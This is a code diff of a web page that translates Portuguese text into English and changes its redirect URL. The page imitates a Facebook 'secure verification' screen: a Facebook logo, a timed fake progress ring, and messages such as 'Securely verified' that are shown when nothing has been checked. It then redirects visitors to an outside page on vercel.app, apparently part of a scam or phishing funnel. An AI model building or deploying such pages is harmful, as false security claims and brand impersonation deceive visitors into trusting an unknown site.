@@ -1,18 +1,18 @@
 <!doctype html>
-<html lang="pt-br">
+<html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
-  <title>Verificação – Carregando…</title>
+  <title>Verification – Loading…</title>
   <meta name="theme-color" content="#0ea5e9" />
   <style>
     :root{
       --bg1:#0ea5e9; --bg2:#1d4ed8;
-      --ring:#e5e7eb; --accent:#1877f2; /* azul Facebook */
+      --ring:#e5e7eb; --accent:#1877f2; /* Facebook blue */
       --ok:#16a34a;
-      --size: 180px;            /* diâmetro do anel */
-      --thickness: 10px;        /* espessura do anel */
-      --p: 0;                   /* progresso 0..100 (JS atualiza) */
+      --size: 180px;       
+      --thickness: 10px;   
+      --p: 0;               
     }
     *{box-sizing:border-box}
     html,body{height:100%}
@@ -33,7 +33,7 @@
     .msg{font-weight:700; line-height:1.3; margin:0 0 18px;}
     .muted{font-size:12px; color:#475569; margin-top:12px}
 
-    /* --- Círculo de progresso --- */
+    /* --- Progress circle --- */
     .ring{
       width:var(--size); height:var(--size); margin:0 auto; position:relative;
       display:grid; place-items:center; border-radius:50%;
@@ -75,16 +75,16 @@
 </head>
 <body>
   <main class="wrap" role="main" aria-labelledby="msg">
-    <h1 id="msg" class="msg" aria-live="polite">Entrando em um ambiente seguro para verificação.</h1>
+    <h1 id="msg" class="msg" aria-live="polite">Entering a secure environment for verification.</h1>
 
-    <div id="progressWrap" class="ring" aria-label="Progresso de verificação">
+    <div id="progressWrap" class="ring" aria-label="Verification progress">
       <span class="dot" aria-hidden="true"></span>
       <div class="core" id="core">
-        <img id="icon" alt="Carregando verificação" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" />
+        <img id="icon" alt="Loading verification" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" />
       </div>
     </div>
 
-    <p class="muted" id="hint">Validando dados…</p>
+    <p class="muted" id="hint">Validating data…</p>
   </main>
 
   <script>
@@ -94,9 +94,9 @@
       const core = document.getElementById('core');
       const hint = document.getElementById('hint');
 
-      const DURATION_MS = 2600;           // duração do “preenchimento”
-      const REDIRECT_DELAY_MS = 1000;     // 1s após concluir
-      const REDIRECT_URL = "https://presellemp.vercel.app/pagina2.html";
+      const DURATION_MS = 2600;          
+      const REDIRECT_DELAY_MS = 1000;    
+      const REDIRECT_URL = "https://job-eight-snowy.vercel.app/pagina2.html";
 
       const start = performance.now();
 
@@ -104,7 +104,7 @@
         const t = Math.min(1, (now - start) / DURATION_MS);
         const pct = Math.round(t * 100);
         ring.style.setProperty('--p', pct);
-        hint.textContent = pct < 100 ? `Validando dados… ${pct}%` : 'Concluído';
+        hint.textContent = pct < 100 ? `Validating data… ${pct}%` : 'Completed';
         if (t < 1){
           requestAnimationFrame(frame);
         } else {
@@ -118,13 +118,12 @@
         icon.style.transform = 'scale(0.9)';
         setTimeout(()=>{
           icon.src = verified;
-          icon.alt = "Verificação concluída";
+          icon.alt = "Verification completed";
           icon.style.opacity = '1';
           icon.style.transform = 'scale(1)';
           document.body.classList.add('done');
           core.classList.add('pulse');
-          hint.textContent = 'Verificado com segurança. Redirecionando…';
-          // ⏩ redireciona 1s depois
+          hint.textContent = 'Securely verified. Redirecting…';
           setTimeout(()=>{ window.location.assign(REDIRECT_URL); }, REDIRECT_DELAY_MS);
         }, 220);
       }
